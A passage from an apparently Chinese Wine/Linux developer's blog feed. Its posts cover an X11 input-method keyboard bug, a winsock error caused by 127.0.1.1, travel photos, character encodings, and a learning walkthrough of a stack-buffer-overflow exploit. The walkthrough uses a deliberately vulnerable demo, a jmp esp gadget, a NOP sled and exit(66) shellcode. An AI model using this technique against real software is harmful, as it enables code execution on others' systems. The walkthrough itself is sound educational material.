<p>grep -a -E “KeyRelease|KeyPress” ~/222.txt<br><img src="/2024/05/29/wine-%E8%B5%9B%E6%89%AC%E8%87%AA%E5%8A%A9%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%89%AB%E7%A0%81%E5%A4%A7%E5%B0%8F%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/6.png" alt="图6"></p>
</blockquote>
</li>
<li>发现当前应用在按下“J”时，已经提前将Shift_L释放，其异常总体流程为:</li>
</ol>
<ul>
<li>KeyPress(Shift_L)-&gt;KeyPress (J)-&gt;KeyRelease(Shift_L)-&gt;KeyRelease(j)</li>
</ul>
<ol start="4">
<li>正常的“P”大写按键流程为：</li>
</ol>
<ul>
<li>KeyPress(Shift_L)-&gt;KeyPress(P)-&gt;KeyRelease(Shift_L)-&gt;KeyRelease”p”</li>
</ul>
<ol start="5">
<li><p>通过3,4发现按键事件存在异常，通过<a href="https://www.x.org/releases/X11R7.6/doc/libX11/specs/XIM/xim.html#filtering_events">The Input Method Protocol</a>文档中发现如果使用xim协议注册了xic,就会先将事件提供至输入法框架，如下图：<br><img src="/2024/05/29/wine-%E8%B5%9B%E6%89%AC%E8%87%AA%E5%8A%A9%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%89%AB%E7%A0%81%E5%A4%A7%E5%B0%8F%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/7.png" alt="图7"></p>
</li>
<li><p>开启输入法日志，查看接收的事件变化</p>
<blockquote>
<p>fcitx5 -r –verbose *=5</p>
</blockquote>
</li>
<li><p>如下图，其中<code>XIM Key Event: 2</code>为按下事件，发现当前系统中输入法是正常发送<code>shift+j</code>事件至应用中的，但应用日志存在大量KeyRelease(Shift_L)事件，将KeyPress(Shift_L)事件提前释放<br><img src="/2024/05/29/wine-%E8%B5%9B%E6%89%AC%E8%87%AA%E5%8A%A9%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%89%AB%E7%A0%81%E5%A4%A7%E5%B0%8F%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/8.png" alt="图8"><br><img src="/2024/05/29/wine-%E8%B5%9B%E6%89%AC%E8%87%AA%E5%8A%A9%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%89%AB%E7%A0%81%E5%A4%A7%E5%B0%8F%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/9.png" alt="图9"></p>
</li>
<li><p>查看wine下的事件代码，在<code>/dlls/winex11.drv/event.c</code>的<code>process_events</code>函数中处理窗口事件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (XCheckIfEvent( display, &amp;event, filter, (<span class="keyword">char</span> *)arg ))</span><br><span class="line">   &#123;</span><br><span class="line">       count++;</span><br><span class="line">       <span class="keyword">if</span> (XFilterEvent( &amp;event, None ))</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="comment">//continue;</span></span><br><span class="line">           <span class="comment">/*</span></span><br><span class="line"><span class="comment">            * SCIM on linux filters key events strangely. It does not filter the</span></span><br><span class="line"><span class="comment">            * KeyPress events for these keys however it does filter the</span></span><br><span class="line"><span class="comment">            * KeyRelease events. This causes wine to become very confused as</span></span><br><span class="line"><span class="comment">            * to the keyboard state.</span></span><br><span class="line"><span class="comment">            *</span></span><br><span class="line"><span class="comment">            * We need to let those KeyRelease events be processed so that the</span></span><br><span class="line"><span class="comment">            * keyboard state is correct.</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">           <span class="keyword">if</span> (event.type == KeyRelease)</span><br><span class="line">           &#123;</span><br><span class="line">               KeySym keysym = <span class="number">0</span>;</span><br><span class="line">               XKeyEvent *keyevent = &amp;event.xkey;</span><br><span class="line"></span><br><span class="line">               XLookupString(keyevent, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;keysym, <span class="literal">NULL</span>);</span><br><span class="line">               <span class="keyword">if</span> (!(keysym == XK_Shift_L ||</span><br><span class="line">                   keysym == XK_Shift_R ||</span><br><span class="line">                   keysym == XK_Control_L ||</span><br><span class="line">                   keysym == XK_Control_R ||</span><br><span class="line">                   keysym == XK_Alt_R ||</span><br><span class="line">                   keysym == XK_Alt_L ||</span><br><span class="line">                   keysym == XK_Meta_R ||</span><br><span class="line">                   keysym == XK_Meta_L))</span><br><span class="line">                       <span class="keyword">continue</span>; <span class="comment">/* not a key we care about, ignore it */</span></span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">               <span class="keyword">continue</span>;  <span class="comment">/* filtered, ignore it */</span></span><br><span class="line">       &#125;</span><br><span class="line">       get_event_data( &amp;event );</span><br><span class="line">       <span class="keyword">if</span> (prev_event.type) action = merge_events( &amp;prev_event, &amp;event );</span><br><span class="line">       ...</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li>
<li><p>发现代码中通过“XFilterEvent”过滤事件时，未将KeyRelease事件全部过滤，XK_Control_L也会进入函数正常处理，如第五点中的图中所示，程序如果使用xim并且注册xic，会将输入法需要的按键事件（XK_Control_L释放消息）通过XFilterEvent与XNextEvent发送至输入法再转发至应用。通过wine下的注释得知，此过滤操作是特殊处理输入法框架SCIM，因为其框架未能正常处理KeyRelease消息需要wine中特殊处理完成。</p>
</li>
</ol>
<h2 id="分析结论"><a href="#分析结论" class="headerlink" title="分析结论"></a>分析结论</h2><pre><code>通过上述分析与验证代码，可以初步猜测在nfs系统上如果存在输入法并在较慢芯片硬件上，快速触发按键释放消息，会导致wine应用接收消息错乱，导致应用未能正确处理按键按下释放消息。
</code></pre>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><ul>
<li>方案1： 卸载输入法，将按键消息直接通过窗管发送至应用，即XFilterEvent不会过滤窗管发送至应用的KeyRelease消息，经验证可以解决大小写问题。</li>
<li>方案2：读取系统中环境变量XMODIFIERS，若其设置为SCIM，则进入此判断循环，若不是则不进入，大致代码如下：<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span>* env = getenv(<span class="string">&quot;XMODIFIERS&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (XCheckIfEvent( display, &amp;event, filter, (<span class="keyword">char</span> *)arg ))</span><br><span class="line">&#123;</span><br><span class="line">    count++;</span><br><span class="line">    <span class="keyword">if</span> (XFilterEvent( &amp;event, None ))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">NULL</span> == env || <span class="built_in">strcmp</span>(env, <span class="string">&quot;@im=SCIM&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ‘’‘‘’‘</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
修改后效果如下：<br>  <img src="/2024/05/29/wine-%E8%B5%9B%E6%89%AC%E8%87%AA%E5%8A%A9%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%89%AB%E7%A0%81%E5%A4%A7%E5%B0%8F%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/10.png" alt="图10"></li>
</ul>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这个问题通过对于x11窗口分析的几个工具与wine中的日志进行分析定位，该问题是需要开发者熟悉输入法与wine中的交互关系，理清其中消息处理步骤，才能把握问题根本原因。</p>
]]></content>
      <categories>
        <category>wine</category>
      </categories>
      <tags>
        <tag>wine</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】sock模块显示0xc000000d错误码问题分析</title>
    <url>/2024/03/19/wine-sock%E6%A8%A1%E5%9D%97%E6%98%BE%E7%A4%BA0xc000000d%E9%94%99%E8%AF%AF%E7%A0%81%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="sock模块显示0xc000000d错误码问题分析"><a href="#sock模块显示0xc000000d错误码问题分析" class="headerlink" title="sock模块显示0xc000000d错误码问题分析"></a>sock模块显示0xc000000d错误码问题分析</h1><span id="more"></span>

<h2 id="问题概述"><a href="#问题概述" class="headerlink" title="问题概述"></a>问题概述</h2><p>在机房监控应用启动时，ws2_32.dll模块中报错<code>connect failed, status 0xc000000d</code></p>
<h2 id="分析逻辑"><a href="#分析逻辑" class="headerlink" title="分析逻辑"></a>分析逻辑</h2><ol>
<li>错误日志为：connect failed, status 0xc000000d，0xc000000d是系统中的一个常见错误代码，表示 “INVALID_PARAMETER”，即无效的参数</li>
<li>打印server与winsock日志，发现winsock在connect函数报错，server在ioctl中报错，同样返回为参数错误问题，在<code>connect</code>函数日志中参数传入为<code>socket 0x50,&#123; family AF_INET, address 192.0.xxx.xxx, port xxxxx &#125;, len 40</code>，经验判断传入参数无问题</li>
<li>编写demo验证，并传入相同参数，验证connect成功未报错</li>
<li>查看 winsock 日志，其中观察socket 0x50 创建流程，发现其在connet前调用bind函数</li>
<li>查看bind日志参数，<code>socket 0x50,&#123; family AF_INET, address 127.0.1.1, port 0 &#125;</code>，查看此日志基本就发现出现原因了</li>
<li>问题原因：<code>127.0.1.1</code>地址为回环地址，通常使用本地应用sock,当创建sock绑定此地址时，不能访问非本机地址</li>
<li>继续分析日志发现其通过<code>getaddrinfo</code>函数获取当前系统ip,但在wine下通过此函数返回<code>127.0.1.1</code>，如下图<br><img src="/2024/03/19/wine-sock%E6%A8%A1%E5%9D%97%E6%98%BE%E7%A4%BA0xc000000d%E9%94%99%E8%AF%AF%E7%A0%81%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/1.png" alt="图1"><br><img src="/2024/03/19/wine-sock%E6%A8%A1%E5%9D%97%E6%98%BE%E7%A4%BA0xc000000d%E9%94%99%E8%AF%AF%E7%A0%81%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/2.png" alt="图2"></li>
<li>经demo验证发现在nfs下的getaddrinfo函数无法获取到当前系统所有ip地址，但在deepin通过此函数是可行的</li>
<li>getaddrinfo函数首先是通过系统中<code>/etc/hosts</code>文件中获取，若此文件中存在当传入的主机名称对应ip地址时则直接返回，在nfs上系统安装时，会默认将<code>127.0.1.1</code>与主机名称写入至当前系统<code>/etc/hosts</code>，</li>
<li><a href="https://www.debian.org/doc/manuals/debian-reference/ch05.en.html#_the_hostname_resolution">debian官方文档</a>显示当系统安装的时候若没有设置ip地址则会将<code>127.0.1.1</code>设置为系统ip以防止某些软件存在bug，若存在固定ip则需要进行替换</li>
<li>修改应用安装包的preinstall,将hosts文件中的127.0.1.1替换为当前系统ip解决此问题</li>
</ol>
]]></content>
      <categories>
        <category>wine</category>
      </categories>
      <tags>
        <tag>wine</tag>
      </tags>
  </entry>
  <entry>
    <title>【旅游】厦门行</title>
    <url>/2024/02/23/%E5%8E%A6%E9%97%A8%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="过年逛逛厦门"><a href="#过年逛逛厦门" class="headerlink" title="过年逛逛厦门"></a>过年逛逛厦门</h1><span id="more"></span>

<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>过年在厦门值班顺便逛逛厦门</p>
<h4 id="楚雨荨他家"><a href="#楚雨荨他家" class="headerlink" title="楚雨荨他家"></a>楚雨荨他家</h4><p><img src="/2024/02/23/%E5%8E%A6%E9%97%A8%E8%A1%8C/%E5%9B%BE1.jpg" alt="图1"></p>
<h4 id="泉州扎花"><a href="#泉州扎花" class="headerlink" title="泉州扎花"></a>泉州扎花</h4><p><img src="/2024/02/23/%E5%8E%A6%E9%97%A8%E8%A1%8C/%E5%9B%BE2.jpg" alt="图2"></p>
<h4 id="厦门植物园植物"><a href="#厦门植物园植物" class="headerlink" title="厦门植物园植物"></a>厦门植物园植物</h4><p><img src="/2024/02/23/%E5%8E%A6%E9%97%A8%E8%A1%8C/%E5%9B%BE3.jpg" alt="图3"></p>
<h4 id="回家路上"><a href="#回家路上" class="headerlink" title="回家路上"></a>回家路上</h4><p><img src="/2024/02/23/%E5%8E%A6%E9%97%A8%E8%A1%8C/%E5%9B%BE4.jpg" alt="图4"></p>
<p>总结：厦门不愧是南方城市，天气暖和空气清新，过年只要是叫得出名字的地方都是人挨人</p>
]]></content>
      <categories>
        <category>运动</category>
      </categories>
      <tags>
        <tag>旅游</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】理解ASCII，Unicode，UTF-8，wchar，char</title>
    <url>/2024/01/11/%E5%AD%97%E7%AC%A6%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="理解ASCII，Unicode，UTF-8，wchar，char"><a href="#理解ASCII，Unicode，UTF-8，wchar，char" class="headerlink" title="理解ASCII，Unicode，UTF-8，wchar，char"></a>理解ASCII，Unicode，UTF-8，wchar，char</h1><span id="more"></span>
<p><a href="http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html">字符编码笔记：ASCII，Unicode 和 UTF-8</a><br><a href="https://r12a.github.io/app-conversion/">各种编码在线转换工具</a></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="一、ASCII-码"><a href="#一、ASCII-码" class="headerlink" title="一、ASCII 码"></a>一、ASCII 码</h2><p>只有128个，只占用了一个字节的后面7位，最前面的一位统一规定为0（01000000-01111111）</p>
<h2 id="二、非-ASCII-编码"><a href="#二、非-ASCII-编码" class="headerlink" title="二、非 ASCII 编码"></a>二、非 ASCII 编码</h2><p>不同的国家有不同的字母，有256个，占用了一个完整的字节八位（00000000-11111111）</p>
<h2 id="三、-Unicode"><a href="#三、-Unicode" class="headerlink" title="三、 Unicode"></a>三、 Unicode</h2><p>Unicode 是一个很大的集合，现在的规模可以容纳100多万个符号，但存在字节浪费问题。比如，汉字严的 Unicode 是十六进制数4E25，转换成二进制数足足有15位（100111000100101），也就是说，这个符号的表示至少需要2个字节。表示其他更大的符号，可能需要3个字节或者4个字节，甚至更多。</p>
<h2 id="四、UTF-8"><a href="#四、UTF-8" class="headerlink" title="四、UTF-8"></a>四、UTF-8</h2><p>UTF-8 就是在互联网上使用最广的一种 Unicode 的实现方式。对于n字节的符号（n &gt; 1），第一个字节的前n位都设为1，第n + 1位设为0，后面字节的前两位一律设为10。剩下的没有提及的二进制位，全部为这个符号的 Unicode 码。</p>
<h2 id="五、GB2312"><a href="#五、GB2312" class="headerlink" title="五、GB2312"></a>五、GB2312</h2><p>GB2312-80GB 2312 或 GB 2312-80 是中国国家标准简体中文字符集，全称《信息交换用汉字编码字符集·基本集》，又称 GB 0，由中国国家标准总局发布，1981 年 5 月 1 日实施。GB 2312 编码通行于中国大陆；新加坡等地也采用此编码。中国大陆几乎所有的中文系统和国际化的软件都支持 GB 2312</p>
<h2 id="六、GBK"><a href="#六、GBK" class="headerlink" title="六、GBK"></a>六、GBK</h2><p>GBK 即汉字内码扩展规范，K 为汉语拼音 Kuo Zhan（扩展）中“扩”字的声母。英文全称 Chinese Internal Code Specification。GBK 共收入 21886 个汉字和图形符号，包括：</p>
<ul>
<li>GB 2312 中的全部汉字、非汉字符号。</li>
<li>BIG5 中的全部汉字。</li>
<li>与 ISO 10646 相应的国家标准 GB 13000 中的其它 CJK 汉字，以上合计 20902 个汉字。</li>
<li>其它汉字、部首、符号，共计 984 个。</li>
</ul>
<h2 id="七、GB18030"><a href="#七、GB18030" class="headerlink" title="七、GB18030"></a>七、GB18030</h2><p>GB 18030，全称：国家标准 GB 18030-2005《信息技术中文编码字符集》，是中华人民共和国现时最新的内码字集，是 GB 18030-2000《信息技术信息交换用汉字编码字符集基本集的扩充》的修订版。GB 18030 与 GB 2312-1980 和 GBK 兼容，共收录汉字70244个。</p>
<p>GB 18030 编码是一二四字节变长编码。单字节，其值从 0 到 0x7F，与 ASCII 编码兼容。双字节，第一个字节的值从 0x81 到 0xFE，第二个字节的值从 0x40 到 0xFE（不包括0x7F），与 GBK 标准兼容。四字节，第一个字节的值从 0x81 到 0xFE，第二个字节的值从 0x30 到 0x39，第三个字节从0x81 到 0xFE，第四个字节从 0x30 到 0x39。</p>
<h2 id="八、char"><a href="#八、char" class="headerlink" title="八、char"></a>八、char</h2><p>char 是 8 位类型，只能存储单字节字符，例如ASCII 码，单字节UTF-8，单字节Unicode，无法存放中文，中文为双字节字符，例如：<code>char code = L&#39;a&#39;;</code></p>
<h2 id="九、wchar"><a href="#九、wchar" class="headerlink" title="九、wchar"></a>九、wchar</h2><p>wchar 是 一个 16 位宽字符，用于存储编码为 UTF-16LE 的 Unicode，可以存储中文，例如：<code>wchar_t chineseChar = L&#39;中&#39;;</code></p>
<h2 id="十、ttf字体文件"><a href="#十、ttf字体文件" class="headerlink" title="十、ttf字体文件"></a>十、ttf字体文件</h2><p>二进制格式存放的字体，其中包括字体的格式与其对应的Unicode</p>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>Linux技术分享</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】栈溢出漏洞-shellcode学习</title>
    <url>/2023/11/21/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E-shellcode%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="栈溢出漏洞-shellcode学习"><a href="#栈溢出漏洞-shellcode学习" class="headerlink" title="栈溢出漏洞-shellcode学习"></a>栈溢出漏洞-shellcode学习</h1><p><em><strong>最近在wine开发中发现一些关于漏洞知识点,很有意思记录一下。<a href="https://evilpan.com/2018/03/17/exploit-the-stack/">参考</a></strong></em></p>
<span id="more"></span>

<h2 id="esp-ebp"><a href="#esp-ebp" class="headerlink" title="esp/ebp"></a>esp/ebp</h2><ul>
<li>esp:栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶,向上偏移。/低地址 </li>
<li>ebp:基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。/高地址<br><img src="/2023/11/21/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E-shellcode%E5%AD%A6%E4%B9%A0/1.jpg" alt="图1"></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> arg1, <span class="keyword">int</span> arg2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> local1;</span><br><span class="line">    <span class="keyword">int</span> local2;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么该函数的栈帧布局如下:<br><img src="/2023/11/21/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E-shellcode%E5%AD%A6%E4%B9%A0/2.png" alt="图2"></p>
<h2 id="栈溢出程序"><a href="#栈溢出程序" class="headerlink" title="栈溢出程序"></a>栈溢出程序</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello %s\n&quot;</span>, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    foo();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;good bye!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dummy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;nop; jmp esp&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gcc test.c -o victim -g -m32 -no-pie -masm=intel -fno-stack-protector -z execstack</p>
<h2 id="函数返回地址"><a href="#函数返回地址" class="headerlink" title="函数返回地址"></a>函数返回地址</h2><pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) run</span><br><span class="line">Starting program: &#x2F;home&#x2F;mecry&#x2F;dde-c&#x2F;metho&#x2F;metho1&#x2F;victim </span><br><span class="line">AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAAN</span><br><span class="line">hello AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAAN</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x41494141 in ?? ()</span><br><span class="line">(gdb) p $eip</span><br><span class="line">$1 &#x3D; (void (*)()) 0x41494141</span><br></pre></td></tr></table></figure>
</code></pre>
<p>用p打印eip的值(eip是存储下一个执行的语句),41494141代表小端的AAIA,确认的函数的返回地址出现在De Brujin序列的第23字节.目标就是将shellcode代码在返回地址执行.</p>
<h2 id="栈溢出地址"><a href="#栈溢出地址" class="headerlink" title="栈溢出地址"></a>栈溢出地址</h2><ol>
<li>查找jmp esp的机器码是多少 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ rasm2 -a x86 -b 32 &quot;nop; jmp esp&quot;</span><br><span class="line">90ffe4</span><br></pre></td></tr></table></figure></li>
<li>上面的测试程序中有一个<code>dummy()</code>函数,通过这个函数找到jmp esp的地址 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ r2 .&#x2F;victim </span><br><span class="line">-- Wow, my cat knows radare2 hotkeys better than me!</span><br><span class="line">[0x08049070]&gt; &#x2F;x 90ffe4</span><br><span class="line">Searching 3 bytes in [0x804c024-0x804c028]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 3 bytes in [0x804bf0c-0x804c024]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 3 bytes in [0x804a000-0x804a1b8]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 3 bytes in [0x8049000-0x8049278]</span><br><span class="line">hits: 1</span><br><span class="line">Searching 3 bytes in [0x8048000-0x804834c]</span><br><span class="line">hits: 0</span><br><span class="line">0x080491ed hit0_0 90ffe4</span><br></pre></td></tr></table></figure>
找到地址为<code>0x080491ed</code>,我们返回地址确定就是这个了.</li>
</ol>
<p><strong>问:为什么要将这个地址覆盖返回地址?</strong></p>
<p>回答:如果用jmp esp覆盖返回地址，那么在函数返回后会执行jmp esp，跳到esp，也就是返回地址的下一地址开始执行<br>因此，将shellcode放于返回地址之后，并将返回地址覆盖为jmp esp，就可以避免shellcode在内存中产生的移位问题</p>
<h2 id="shellcode编写和payload构造"><a href="#shellcode编写和payload构造" class="headerlink" title="shellcode编写和payload构造"></a>shellcode编写和payload构造</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov eax, 0x01;</span><br><span class="line">mov ebx, 66;</span><br><span class="line">int 0x80;</span><br></pre></td></tr></table></figure>
<p>其中0x01是exit的系统调用号, ebx为参数, 即我们想程序立刻结束并返回66. 用rasm2来编译生成机器码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ rasm2 -a x86 -b 32 -f shellcode.asm </span><br><span class="line">b801000000bb42000000cd80</span><br></pre></td></tr></table></figure>
<p>配合前面确定的返回地址, 可以构造一个payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;A&#39;*22 + &#39;\xed\x91\x04\x08&#39; + &#39;\x90&#39;*50 + &#39;\xb8\x01\x00\x00\x00\xbb\x42\x00\x00\x00\xcd\x80&#39;&quot;</span><br></pre></td></tr></table></figure>
<p>这里注意返回地址<code>0x080491ed</code>是小端字节序. 还有payload写在返回地址的后面而不是前面, 因为在函数返回后, 经过了leave和ret指令, 已经恢复了原来的栈帧(原本被保护性压入栈, 即高地址中). ‘\x90’*50的作用是填充nop指令, 可以提高payload的鲁棒性, 不用精确指定指令起始地址也能执行, 通常称为NOP sled. 测试下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python -c &quot;print &#39;A&#39;*22 + &#39;\xed\x91\x04\x08&#39; + &#39;\x90&#39;*50 + &#39;\xb8\x01\x00\x00\x00\xbb\x42\x00\x00\x00\xcd\x80&#39;&quot; | .&#x2F;victim</span><br><span class="line">$ echo $?</span><br><span class="line">66</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>wine</category>
      </categories>
      <tags>
        <tag>wine</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】呼叫器窗口问题分析</title>
    <url>/2023/09/13/wine-%E5%91%BC%E5%8F%AB%E5%99%A8%E7%AA%97%E5%8F%A3%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="呼叫器窗口问题分析"><a href="#呼叫器窗口问题分析" class="headerlink" title="呼叫器窗口问题分析"></a>呼叫器窗口问题分析</h1><span id="more"></span>


<h2 id="问题概述"><a href="#问题概述" class="headerlink" title="问题概述"></a>问题概述</h2><p>呼叫器在nfs系统中启动后，在菜单栏无图标显示，但窗口正常显示，用户在最小化窗口时无法找到窗口再启动</p>
<p>正常现象如下图：</p>
<p><img src="/2023/09/13/wine-%E5%91%BC%E5%8F%AB%E5%99%A8%E7%AA%97%E5%8F%A3%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/1.png" alt="图1"></p>
<p>异常现象如下图：</p>
<p><img src="/2023/09/13/wine-%E5%91%BC%E5%8F%AB%E5%99%A8%E7%AA%97%E5%8F%A3%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/2.png" alt="图2"></p>
<p><em><strong>经验证问题复现环境为：</strong></em></p>
<p><em>软件环境</em>：amd架构，nfs-5.0-G212p版本</p>
<p><em>硬件环境</em>：需要amd架构处理器</p>
<p><em>wine版本</em>：上游wine-8.6</p>
<h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><ol>
<li>观察现象，根据曾经的mfc，x11编程经验来看，该类问题的出现有两种可能的原因：<ul>
<li>猜测1：在linux下怀疑启动窗口存在隐藏图标属性</li>
<li>猜测2：是在创建菜单栏时，加载rc的api在wine下不支持或者存在bug</li>
<li>猜测3：在nfs系统下，任务栏加载这个进程时图标显示失败</li>
</ul>
</li>
</ol>
<h2 id="分析验证"><a href="#分析验证" class="headerlink" title="分析验证"></a>分析验证</h2><h3 id="猜测1："><a href="#猜测1：" class="headerlink" title="猜测1："></a>猜测1：</h3><ol>
<li>介绍两个观察x窗口的工具,xprop与xwininfo<pre><code> - xwininfo：列出窗口的基本几何信息和状态，简单用法是在终端里面执行命令 `xwininfo` 之后， 此时系统鼠标光标被 `xwininfo` 捕获，光标变成十字星形状，移动鼠标点击要查看的窗口的任意区域，执行`xwininfo`的终端输出了该窗口的这些 X11 属性.
 - 列出窗口的全部X11属性，简单用法是在终端里面执行命令 `xprop` 之后， 此时系统鼠标光标被 `xprop` 捕获，光标变成十字星形状，移动鼠标点击要查看的窗口的任意区域，执行`xprop`的终端输出了该窗口的所有 X11 属性.
</code></pre>
</li>
<li>通过xwininfo获取窗口id，再通过xprop -id <window_id> _NET_WM_STATE | grep “_NET_WM_STATE_SKIP_TASKBAR”，判断呼叫器窗口未设置隐藏菜单栏窗口属性</window_id></li>
</ol>
<h3 id="猜测2："><a href="#猜测2：" class="headerlink" title="猜测2："></a>猜测2：</h3><ol>
<li>开启api monitor监控，按照问题在nfs上复现的步骤在windows上操作呼叫器，关注<code>loadicon</code>，<code>loadimge</code>，<code>createicon</code>,等关于hfont创建加载的函数，发现有两个创建有<code>icon</code>资源加载<br><img src="/2023/09/13/wine-%E5%91%BC%E5%8F%AB%E5%99%A8%E7%AA%97%E5%8F%A3%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/3.png" alt="图3"><br><img src="/2023/09/13/wine-%E5%91%BC%E5%8F%AB%E5%99%A8%E7%AA%97%E5%8F%A3%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/4.png" alt="图4"></li>
<li>发现存在两个窗口都有<code>icon</code>资源加载，通过<code>spy++</code>确定目标创建句柄，通过<code>api monitor</code>或者<code>od</code>观察句柄创建后的函数，发现窗口调用<code>ole.dll</code>的<code>OleLoadPictureExt</code>函数加载资源并在<code>createwindow</code>下进行赋值。<br><img src="/2023/09/13/wine-%E5%91%BC%E5%8F%AB%E5%99%A8%E7%AA%97%E5%8F%A3%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/5.png" alt="图5"></li>
<li>本地实现简单demo，加载图片资源然后创建窗口进行赋值，如下（/呼叫器/code/demo.c）： <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 加载图像并设置为窗口图标</span></span><br><span class="line"><span class="function">HICON <span class="title">LoadAndSetWindowIcon</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">CoInitialize</span>(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 假设pStream已经被初始化并包含了图片数据</span></span><br><span class="line">    IStream *pStream = <span class="built_in">ReadImageToLPSTREAM</span>();</span><br><span class="line">    <span class="comment">// 图片的宽度和高度（设为0表示使用默认的图片尺寸）</span></span><br><span class="line">    LONG width = <span class="number">0</span>;</span><br><span class="line">    LONG height = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 是否保持图片的比例</span></span><br><span class="line">    BOOL keepAspectRatio = TRUE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载图片</span></span><br><span class="line">    IPicture *pPicture = <span class="literal">NULL</span>;</span><br><span 